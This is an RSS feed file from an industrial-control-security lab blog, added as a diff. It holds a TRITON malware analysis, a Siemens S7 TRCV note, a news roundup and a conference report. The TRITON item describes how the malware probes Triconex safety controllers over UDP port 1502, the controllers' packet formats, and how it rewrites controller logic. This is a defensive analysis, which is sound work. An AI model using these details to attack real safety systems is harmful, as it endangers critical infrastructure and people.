@@ -1,0 +1,2084 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>工匠安全实验室 | 专注于工控安全</title><link>http://icsmaster.com/</link><description></description><atom:link href="http://icsmaster.com/feed.xml" rel="self"></atom:link><lastBuildDate>Mon, 08 Jan 2018 14:36:00 +0800</lastBuildDate><item><title>Triton核心源代码分析</title><link>http://icsmaster.com/security/Triton_src_analysis.html</link><description>&lt;h2&gt;事件概述&lt;/h2&gt;
+&lt;p&gt;FireEye麦迪安调查部门的安全研究人员发现一款针对工控系统（ICS）的恶意软件——“TRITON”，该软件瞄准施耐德电气公司Triconex安全仪表控制系统（Safety Instrumented System，SIS）控制器，造成中东一家能源工厂停运。此次攻击事件导致TRITON恶意软件浮出水面。TRITON旨在破坏关键基础设施中广泛使用的 Triconex 安全控制器，通过扫描和映射工业控制系统环境，以便直接向 Triconex安全控制器提供侦察和发布命令。相关专家推测，鉴于经济动机和攻击的复杂程度，可能有国家资助的相关群体参与其中。
+下面我们对TRITON恶意软件核心的几个模块的源代码的分析。Trilog.exe是恶意软件的主程序，TsLow.py、TsHi.py、TsBase.py是提供控制器核心通信功能。 &lt;/p&gt;
+&lt;h2&gt;Trilog.exe分析&lt;/h2&gt;
+&lt;p&gt;经过分析trilog.exe文件是使用py2exe打包的python程序，可以使用&lt;a href="https://github.com/matiasb/unpy2exe"&gt;unpy2exe&lt;/a&gt;工具进行反编译。解出的的文件是pyc格式的script_test.py.pyc，再通过&lt;a href="http://icsmaster.org/download/pyc_uncompile/"&gt;unpyc工具&lt;/a&gt;将pyc还原成py的源代码。
+&lt;img alt="Alt text" src="/static/images/triton/1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/2.png" /&gt;&lt;/p&gt;
+&lt;p&gt;最终解出来的源代码如下图所示：
+&lt;img alt="Alt text" src="/static/images/triton/3.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/5.png" /&gt;&lt;/p&gt;
+&lt;p&gt;程序逻辑流程如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;首先初始化一个TsHi实例对象。&lt;/li&gt;
+&lt;li&gt;连接输入目标设备（设备IP由参数进行传入），也就是说此文件启动时会传入一个目标设备的IP地址。&lt;/li&gt;
+&lt;li&gt;连接失败，直接退出程序。&lt;/li&gt;
+&lt;li&gt;读取文件inject.bin和imain.bin进行拼接，组成最终要下载的数据，如果文件读取失败直接退出程序 。&lt;/li&gt;
+&lt;li&gt;先下载一段代码，测试增量下载是否成功（PresetStatusField），如果不成功直接返回。&lt;/li&gt;
+&lt;li&gt;确保下载正常后，将目标的程序进行增量下载（test.SafeAppendProgramMod(data)）&lt;/li&gt;
+&lt;li&gt;然后循环判断控制器的状态，确定增量下载的程序是否运行正常。&lt;/li&gt;
+&lt;li&gt;下载失败就强制移除程序。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;流程图如下：&lt;/strong&gt;
+&lt;img alt="Alt text" src="/static/images/triton/6.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;TsLow.py源码分析&lt;/h2&gt;
+&lt;p&gt;此文件是通信最底层的文件，提供基础的UDP的通信，如下图所示。其中udp_ 开头的函数是基础UDP通信函数，tcm_ 和tc_ 开头的函数是对Triconex安全仪表控制系统控制器的报文格式进行封装的通信函数，tcm_ 负责最外一层数据封装，tc_ 负责 tcm_ 结构中的数据字段的封装。
+&lt;img alt="Alt text" src="/static/images/triton/7.png" /&gt;&lt;/p&gt;
+&lt;p&gt;其中设备探测函数“detect_ip”非常关键，意图非常明显，指定了通信端口为1502，通过UDP协议发送一个特制的广播的报文，接收返回的信息，来判断是否为目标设备，一旦发现目标设备通过端口1502返回信息，则保存设备的IP地址，同时发送一个关闭通信链接的报文给目标设备。此代码明确的告诉我们针对Triconex安全仪表控制系统控制器的探测方法。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/8.png" /&gt;&lt;/p&gt;
+&lt;p&gt;再看tcm_exec函数，通过此函数我们可以分析出控制器的tcm通信报文结构，代码如下图&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/9.png" /&gt;
+&lt;img alt="Alt text" src="/static/images/triton/10.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Triconex安全仪表控制系统控制器的TCM通信格式由两个字节的功能码、两个字节的数据字段长度、若干个字节的数据字段、两个字节的CRC校验码组成，典型的TLV格式的通信协议，具体格式如下图所示。
+&lt;img alt="Alt text" src="/static/images/triton/e1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;再看ts_exec函数，通过此函数我们可以分析出控制器的tc通信报文结构，源代码如下图所示：
+&lt;img alt="Alt text" src="/static/images/triton/11.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Triconex安全仪表控制系统控制器的TC通信格式由两个字节的未知字段、一个字节的功能码、一个字节的通信计数、两个字节的未知字段、两个字节的校验和
+两个字节的长度字段（等于数据字段长度+10）、若干个数据字段组成，格式如下图所示：
+&lt;img alt="Alt text" src="/static/images/triton/e2.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;TsBase.py源码分析&lt;/h2&gt;
+&lt;p&gt;TsBase类从TsLow继承，主要对控制器的相关功能进行封装，提供上载程序、下载程序，获取版本号，停止程序和运行程序等功能。源代码格式基本都一样，构造对应该功能码的数据包，通过ts_exec函数进行执行。
+&lt;img alt="Alt text" src="/static/images/triton/12.png" /&gt;&lt;/p&gt;
+&lt;p&gt;控制器相关的功能码，此功能码属于TC层的功能码，如下图所示。
+&lt;img alt="Alt text" src="/static/images/triton/e3.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;TsHi.py源码分析&lt;/h2&gt;
+&lt;p&gt;此文件是控制器对外的功能接口，所有的函数提供对外的调用，相关函数由程序主函数进行调用，详见trilog.exe分析。下面分析以个常用的函数。&lt;/p&gt;
+&lt;h3&gt;SafeAppendProgramMod函数分析：&lt;/h3&gt;
+&lt;p&gt;首先获取控制器当前的状态信息，如果运行状态异常（值3）则停止PLC，如果加载状态异常（值5）则取消下载，其它状态直接返回。然后通过上载程序获取工程的Table信息。如下图所示：
+&lt;img alt="Alt text" src="/static/images/triton/13.png" /&gt;&lt;/p&gt;
+&lt;p&gt;“CountFunction”函数通过上载函数获取当前控制器的Function信息。” AppendProgramMin”函数，通过获取的工程信息和Function信息，计算需要申请的空间，然后启动增量下载，将新的工程代码写入控制器。一旦写入失败，则下发取消下载。然后等待获取状态，如果下载成功，直接返回。程序异常时先停止控制器（HaltProgram），接着下载一个基本代码覆盖下载的程序，然后启动控制器（RunProgram）
+&lt;img alt="Alt text" src="/static/images/triton/14.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/triton/15.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;GetCpStatus函数分析：&lt;/h3&gt;
+&lt;p&gt;此函数属于TsBase的函数，使用的功能码是19，返回控制器状态数据包，如下图所示：
+&lt;img alt="Alt text" src="/static/images/triton/16.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;总结&lt;/h2&gt;
+&lt;p&gt;攻击者对控制器的通信协议非常了解，核心的功能如设备探测、控制器启停等，特别是对程序增量下载的流程非常熟悉，通过增量下载修改控制器的逻辑，一旦成功，隐蔽性非常高，而且目前的安全防御体系根本无法发现，非正常的取证溯源的手段根本无效。但幸庆的是，此攻击过程中一些SIS控制器进入失效的安全状态，自动关闭工业控制流程，导致事件的暴露，TRITION攻击框架从而浮出水面。这是一次典型的针对控制器进行有效攻击的案例，我们也研究过相关的利用手段，一旦恶意攻击者可以控制控制器的程序下载，可以实现很多的功能，比如控制器蠕虫、控制器代理、控制器逻辑炸弹等，攻击的危害是相当大，同时也意味着未来针对控制器的攻击会越来越成熟，我们应该尽快做好相应的安全防范措施，不然攻击来临时我们就会触手无措。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">w3h</dc:creator><pubDate>Mon, 08 Jan 2018 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2018-01-08:security/Triton_src_analysis.html</guid><category>ICS</category><category>Triton</category><category>恶意软件</category><category>施耐德</category></item><item><title>S7-300/1200TRCV变长度接收</title><link>http://icsmaster.com/security/s7_300_1212C_1215C%20TRCV_compare.html</link><description>&lt;h2&gt;1、系统概述&lt;/h2&gt;
+&lt;h3&gt;1.1 概述&lt;/h3&gt;
+&lt;p&gt;S7-1200 CPU和部分S7-300CPU集成PROFINET通讯接口，支持以太网和基于TCP/IP的通信标准，使用这个通信口可以实现CPU与编程设备、与HMI或触摸屏、以及与其他CPU之间的通信。这个PROFINET是支持10/100Mb/s的RJ45接口，支持电缆交叉自适应，因此标准的或交叉的以太网线都可以使用这个接口。&lt;/p&gt;
+&lt;h3&gt;1.2 通信协议&lt;/h3&gt;
+&lt;p&gt;S7-1200/300 CPU的PROFINET通讯接口支持一下通信协议及服务：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;TCP&lt;/li&gt;
+&lt;li&gt;ISO on TCP（RCF1006）&lt;/li&gt;
+&lt;li&gt;S7通信（服务器端）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.3 物理网络连接&lt;/h3&gt;
+&lt;p&gt;直接连接：CPU直接与CPU、HMI或PLC直接连接通信。也就是说两个通信设备直接连接通信，不需要经过交换机。
+&lt;img alt="Alt text" src="/static/images/s7_300_trcv/1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;网络连接：多个设备通过交换机相互连接。
+&lt;img alt="Alt text" src="/static/images/s7_300_trcv/2.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;1.4 TCP通信流程&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/3.png" /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PLC通过TCON建立连接&lt;/li&gt;
+&lt;li&gt;连接建立后，通过TSEND向目标对象发送数据，通过TRCV接收目标发送的数据。发送和接收可以同时进行。&lt;/li&gt;
+&lt;li&gt;如果断开连接，则不再执行发送命令。也不再执行接收命令。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. TRCV指令参数&lt;/h2&gt;
+&lt;h3&gt;2.1 TCP不同型号PLC TRCV指令比较&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/4.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;2.2 TRCV管脚参数&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/5.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;2.3 TRCV操作&lt;/h3&gt;
+&lt;p&gt;TRCV 指令将收到的数据写入到通过以下两个变量指定的接收区：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;指向区域起始位置的指针&lt;/li&gt;
+&lt;li&gt;如果不为 0 则为区域长度或 LEN 上提供的值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;说明：
+LEN 参数的默认设置 (LEN = 0) 使用 DATA 参数来确定要传送的数据的长度。 确保TSEND 指令传送的 DATA 的大小与 TRCV 指令的 DATA 参数的大小相同。
+接收所有作业数据后，TRCV 会立即将其传送到接收区并将 NDR 设置为 1。&lt;/p&gt;
+&lt;h3&gt;2.4 TRCV数据输入接收区&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/6.png" /&gt;
+说明：
+&lt;strong&gt;特殊模式&lt;/strong&gt;
+使用 TCP 或 ISO on TCP 协议时可以存在“特殊模式”。 要针对特殊模式组态 TRCV指令，请置位 ADHOC 指令输入参数。 接收区与 DATA构成的区域相同。已接收数据的长度将输出到参数 RCVD_LEN 中。
+接收数据块后，TRCV 会立即将数据写入接收区并将 NDR 设置为 1。
+如果将数据存储在“优化”DB（仅符号访问）中，则只能接收数据类型为Byte、Char、USInt 和 SInt 的数组中的数据。&lt;/p&gt;
+&lt;h2&gt;3. 变长度接收实例&lt;/h2&gt;
+&lt;h3&gt;3.1 S7-315-2PN/DP&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/7.png" /&gt;
+说明：
+在LEN管脚为0的情况下，测得可以变长度接收65528（16382×4）字节。&lt;/p&gt;
+&lt;h3&gt;3.2 s7-1212C&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/8.png" /&gt;&lt;/p&gt;
+&lt;p&gt;说明：
+①图中DATA管脚定义的是接收缓存区的长度，目前测得是8192字节，如果超过8192字节，程序不会报错，但程序不会执行。
+②LEN写入65536表示变长度接收。&lt;/p&gt;
+&lt;h3&gt;3.3 s7-1215C&lt;/h3&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/s7_300_trcv/9.png" /&gt;
+说明：
+①图中DATA管脚定义的是接收缓存区的长度，目前测得是65530字节，如果超过65530字节，程序不会报错，但程序不会执行。
+②LEN管脚写入接收的数据长度，不能超过8192，超过后程序编译不报错，但不执行。
+③ADHOC管脚表示变长度接收，为TRUE有效。如果LEN分配参数（值不超过8192），则接收的长度最大为LEN的长度；如果LEN不分配参数，变长度接收，数值不超过8192字节。&lt;/p&gt;
+&lt;h2&gt;4. 总结&lt;/h2&gt;
+&lt;p&gt;这儿只列出了TRCV在3款不同PLC下的不同，实际应用过程PLC型号相似的可以参考上面的参数设置，比如1212C-CD/CD/DC和1212C-DC/DC/Rly，包括不同版本的PLC。由于目前只测试了上面的3款，其他型号PLC可能和上面的不同，比如1214C，s7-1500系列（没有测试）。由于手中没有其他型号的PLC，所以没有测试，如果以后有机会再测。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;参考资料：《SIMATIC S7 S7-1200 可编程控制器系统手册》&lt;/em&gt;&lt;/strong&gt;
+&lt;strong&gt;&lt;em&gt;使用软件：TIA Portal Step7 Professional V14&lt;/em&gt;&lt;/strong&gt;
+&lt;strong&gt;&lt;em&gt;使用硬件：s7-315-2PN/DP v3.2，s7-1212C v3.0，s7-1215C v4.1。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">feilt</dc:creator><pubDate>Mon, 08 Jan 2018 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2018-01-08:security/s7_300_1212C_1215C TRCV_compare.html</guid><category>工控技术</category></item><item><title>工控安全半月报第五期（2017-12 下）</title><link>http://icsmaster.com/news/monthly_report_12_2.html</link><description>&lt;blockquote&gt;
+&lt;p&gt;工匠安全实验室最新版块，专注工控安全的我们，精选近期全球范围内工控安全领域的重要事件，让您及时了解行业发展动态，洞悉行业尖端技术，探寻行业前进方向。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;行业动态&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.miit.gov.cn/n1146290/n4388791/c5996116/content.html"&gt;工业和信息化部关于印发《工业控制系统信息安全行动计划（2018-2020年）》的通知&lt;/a&gt;
+为贯彻落实《国务院关于深化制造业与互联网融合发展的指导意见》《国务院关于深化“互联网+先进制造业”发展工业互联网的指导意见》等文件精神，加快我国工业控制系统信息安全保障体系建设，提升工业企业工业控制系统信息安全防护能力，促进工业信息安全产业发展，制定《工业控制系统信息安全行动计划（2018-2020年）》。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/18556"&gt;美国国土安全部（DHS）相关部门就恶意软件 HatMan、Triton 等发布工控安全预警&lt;/a&gt;
+网络安全公司 FireEye 和 Dragos 于上周报道称，新型恶意软件 Triton 和 Trisis 通过破坏关键基础设施中广泛使用的施耐德电气 Triconex 安全控制器致使中东部分机构关场停工。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://netsecurity.51cto.com/art/201712/561698.htm"&gt;2018工控安全发展趋势 8个方向直击工业控制系统要害&lt;/a&gt;
+SecureList预测，2018年工控安全将会面临恶意软件及恶意工具不断出现、地下黑市提供攻击服务、定向勒索攻击、工业间谍等方面的风险，但犯罪团伙尚未找到攻击工控系统盈利的办法。与此同时，国家规定也在发生变化，工业安全保险日益走热。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://icsmaster.com/news/hk_conference.html"&gt;工匠安全实验室受邀赴港参加DragonCon2017会议（附PPT）&lt;/a&gt;
+近日，我们受邀赴港参加DragonCon2017会议，在会议上作了两场交流分享。来自中国大陆，中国香港，美国，加拿大，马来西亚，新加坡，英国，台湾等地区和国家的安全研究人员云聚于此，分享这一年的研究成果。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://news.163.com/17/1229/21/D6RQH9A700014SEH.html"&gt;到2020年，山西工控安全行业年产值达30亿元&lt;/a&gt;
+工业控制系统信息安全，是信息安全重要组成部分，山西省经信委今年9月出台了《山西省工业控制系统信息安全“十三五”规划》（以下简称《规划》）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://it.people.com.cn/n1/2017/1228/c1009-29733911.html"&gt;2017国家工业信息安全产业发展联盟年会在杭举行&lt;/a&gt;
+12月27日，由工业和信息化部指导，国家工业信息安全产业发展联盟、国家工业信息安全发展研究中心、浙江省经济和信息化委员会共同主办，浙江省信息安全行业协会承办的2017工业信息安全论坛暨国家工业信息安全产业发展联盟年会在杭州举行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514885530&amp;amp;ver=612&amp;amp;signature=zO6CWbaVT-DLKJcmrZsm9QzFR2cN8wTAVcK44jcbe8*iHvQihETLNukvg3mgiOxk12pR7GD9oROHL2-X00NPTibUQMjal2X7mPaipxR4LSqhWCuwKGbNgoJDS4rks8bu&amp;amp;new=1"&gt;聚焦2017网络安全标准论坛，《网络安全认证规范》正式发布&lt;/a&gt;
+12月15日，以“信息安全标准讲解与技术研讨”为会议主题的“2017网络安全标准论坛暨公安部信息安全标准宣贯培训会”在上海举行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA%3D%3D&amp;amp;mid=2651075011&amp;amp;idx=1&amp;amp;sn=ff15d055c27a2395d6bc04b3ab7fba59&amp;amp;scene=45#wechat_redirect"&gt;你见过针对“风电”的工控安全攻防赛么&lt;/a&gt;
+能源行业的生产和控制系统是我国重要的关键信息基础设施，这一点自不必赘述，但聚焦如电力、石化等某一细分领域的工控安全攻防赛，在中国甚至是全球也并不多见。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514887896&amp;amp;ver=612&amp;amp;signature=F3cUH7*j6ul75ZEfV1Znx9fDe0BHHhRmpb5evA8qiqpMDLyGzwkVWuYMT2*9VaLFiO7glgQV1uBePnnxkK9ug36P4fEt0rc0JMBqZTu7LC0agvDlTcZqqbu2VMjK*gmX&amp;amp;new=1"&gt;工控联盟参加2017年工业信息安全技能大赛&lt;/a&gt;
+12月19日上午，2017年工业信息安全技能大赛在杭州电子科技大学鸣锣开赛。工业和信息化部信息化和软件服务业司、国家工业信息安全发展研究中心、浙江省经济和信息化委员会、国家工业信息安全产业发展联盟、杭州电子科技大学、浙江省电子信息产品检验所的相关领导和嘉宾出席开幕式并致辞。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;技术资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514885530&amp;amp;ver=612&amp;amp;signature=9IVWOy*WeBEixwUpBY4Tp6rhJtfjJWTxs-9RorR0Jjt3-JRfJwbKM7yu6sWctY7bb-HoTiykvS27FbB0Yh*UWdy0v5SLJxHBOOk18sYd*Lnm-Luv4Q885LQU*1Zpm7rF&amp;amp;new=1"&gt;攻击者可操作射频信号从工业网络中窃取数据&lt;/a&gt;
+近期，研究人员发现了一种新型的攻击方法，即攻击者可以通过控制可编程逻辑控制器（PLC）发射出的射频信号来从空气间隙工业网络（Air-Gapped IndustrialNetwork）中窃取数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514885530&amp;amp;ver=612&amp;amp;signature=wOHN2LhbjJVWrbs4wo95EgsHoFy-Us34twF21OVo3jCz8os3-yJ0UlbChOXlPwD*V7q3XI69lg-vMZzFrLbOEm7kKGYPYKReml2JSGUFov-9TJVPdHD8p*4pcf*yXCyV&amp;amp;new=1"&gt;工控系统的指纹识别技术&lt;/a&gt;
+当前，指纹识别技术已被或坏或好的广泛应用于ICT系统。攻击者通过扫描网络获取设备指纹来关联漏洞入侵系统，安全防护者则利用设备指纹来发现系统的脆弱性，检测系统的网络异常。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514885530&amp;amp;ver=612&amp;amp;signature=wOHN2LhbjJVWrbs4wo95EgsHoFy-Us34twF21OVo3jBQFde6flG2esUDUzLONOlBYlzJy0xqiP5Iw3dD8ZgggTtF5TSUMSmQPFbQMEXJAAMmdjvfIArHayN-I4bv6DEt&amp;amp;new=1"&gt;煤炭行业工控系统信息安全防护关键技术研究&lt;/a&gt;
+煤炭行业在走新型工业化发展道路，推进“两化深度融合”过程中，涉及很多新技术、新业务模式的建设和引用，数据共享越来越深入，工控系统越来越开放，而针对工控系统的安全防护措施却严重滞后，导致煤炭行业的工控系统信息安全问题异常突出。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514888481&amp;amp;ver=612&amp;amp;signature=4FM22neF0CEnPadv9uwhAKymKyNHL3p1ArZL7ER9JgsqpOyDKoBnBngbiZLOKwEnAuZiaqxcYF0kqOP5pkY2w2ODpE7AC6h35NicPULzfDOk92NXHAupSHfQw3n39JT5&amp;amp;new=1"&gt;工业安全 | 电力监控系统网络安全漏洞研究和实践&lt;/a&gt;
+电力行业作为国家关键基础设施，控制系统的网络安全关系到国民经济的正常运行，因而非常重要。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1514887792&amp;amp;ver=612&amp;amp;signature=cl78In6v69LKq9T-5aSgdAs507xaF40lWp-stW4H43iw2w*Eb8I6TJ5TZI3lODvc69*GzANGPLnbAJsqdjgnktV8qGZO3p53rC3ZWGcI0kwcuSeUO1Fv3DfI9Qv6aWai&amp;amp;new=1"&gt;等保2.0中工控系统安全扩展要求（一级系统）&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;安全漏洞&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-355-01"&gt;Moxa NPort W2150A and W2250A&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-355-02"&gt;Schneider Electric Pelco VideoXpert Enterprise&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-353-01"&gt;ABB Ellipse&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-353-04"&gt;Siemens LOGO! Soft Comfort&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-353-05"&gt;WECON Technology Co., Ltd. LeviStudio HMI&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Dark_Alex</dc:creator><pubDate>Tue, 02 Jan 2018 10:43:00 +0800</pubDate><guid>tag:icsmaster.com,2018-01-02:news/monthly_report_12_2.html</guid><category>news</category></item><item><title>工匠安全实验室受邀赴港参加DragonCon2017会议</title><link>http://icsmaster.com/news/hk_conference.html</link><description>&lt;p&gt;近日，工匠安全实验室受邀赴港参加DragonCon2017会议，并在会议上作了交流分享，以下为会议概况。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/0.jpg" /&gt;&lt;/p&gt;
+&lt;h2&gt;会议日程&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;时间地点&lt;/th&gt;
+&lt;th align="center"&gt;日程&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;2017/12/14  香港大学黄克競楼&lt;/td&gt;
+&lt;td align="center"&gt;Workshop&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2017/12/15  香港大学黄克競楼&lt;/td&gt;
+&lt;td align="center"&gt;ICS Workshop&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2017/12/16     富豪香港酒店&lt;/td&gt;
+&lt;td align="center"&gt;DragonCon2017&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/1.jpg" /&gt;&lt;/p&gt;
+&lt;h2&gt;ICS Workshop&lt;/h2&gt;
+&lt;p&gt;15日上午，在香港大学举办了ICS Workshop，工匠安全实验室在ICS Workshop上作了180分钟的技术分享。来自世界各地的安全研究人员出席了此次ICS Workshop。工匠安全实验室在工控安全现状，工控安全防护方案方面取得的成果作了分享。同时对工控系统脆弱性进行了演示实验，分享了在工控安全防护方面可能遇到的一些新型的攻击方式。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/2.jpg" /&gt;
+在ICS Workshop中，工匠安全实验室自主开发改进的工控安全测试框架&lt;a href="https://github.com/w3h/isf"&gt;isf&lt;/a&gt;，受到各地专家的广泛好评，与会者积极沟通交流，并且亲手使用安全测试框架对工控设备进行测试实验。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/3.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;此次交流会上用到了我公司自主研发的移动式工控安全实验箱，将实验箱上预留的接口插到展示沙盘上，就可以很方便的进行各种演示实验。也是由于这种便携式的设计，让与会者有机会接触到真正的工业现场设备，可以更深刻的学习和理解工控安全。&lt;/p&gt;
+&lt;p&gt;分享交流会议持续了3个多小时，让传统安全研究人员对工控安全有了基本的了解，每个参与测试环境的研究员也真切的感受到工控设备的安全问题，也让每个人对工控安全有了更直观更深刻的感受。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/4.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;工匠安全实验室希望成为一个播种者，能够在每个人心中都播下一颗关注工控安全的种子，因为国家基础设施都是由工控设备控制的，工控安全事关每个人的人身安全。&lt;/p&gt;
+&lt;h2&gt;DragonCon2017&lt;/h2&gt;
+&lt;p&gt;16日，在富豪香港酒店，DragonCon2017如期而至，来自中国大陆，中国香港，美国，加拿大，马来西亚，新加坡，英国，台湾等地区和国家的安全研究人员云聚于此，分享这一年的研究成果。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/5.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;工匠安全实验室分享的主题为工控PLC蠕虫的实现原理，在源码层面解释和讨论工控PLC蠕虫的实现原理，并且对如何检测和防护做出了阐述。&lt;/p&gt;
+&lt;p&gt;在香港，马来西亚，新加坡等地区和国家，工控安全可谓是新兴课题，所以我们的分享让他们产生浓厚的兴趣，在使用工控安全实验箱进行PLC蠕虫展示实验的时候，大家纷纷拍照，他们都开始意识到工控设施所存在的隐患，以及研究工控安全的必要性。&lt;/p&gt;
+&lt;p&gt;会后，多个国家的参会者与我们进行了深度的交流，希望能够了解学习到更多有关工控安全方面的知识，能够将工控安全的观念和意识带回去传递给自己国家的人。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/hk_conference/6.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;工匠安全实验室受邀参加会议，并且在会议上作了精彩的演讲。受到各方面的一致好评，工匠安全实验室也开始以香港作为纽带和桥梁，慢慢将自己的安全研究成果分享到其他国家和地区，为工控安全行业贡献自己的一份力量。&lt;/p&gt;
+&lt;p&gt;同时，工匠安全实验室也希望能够和各个国家和地区的工控安全公司和研究者合作，交流行业尖端技术，探寻行业前进方向。&lt;/p&gt;
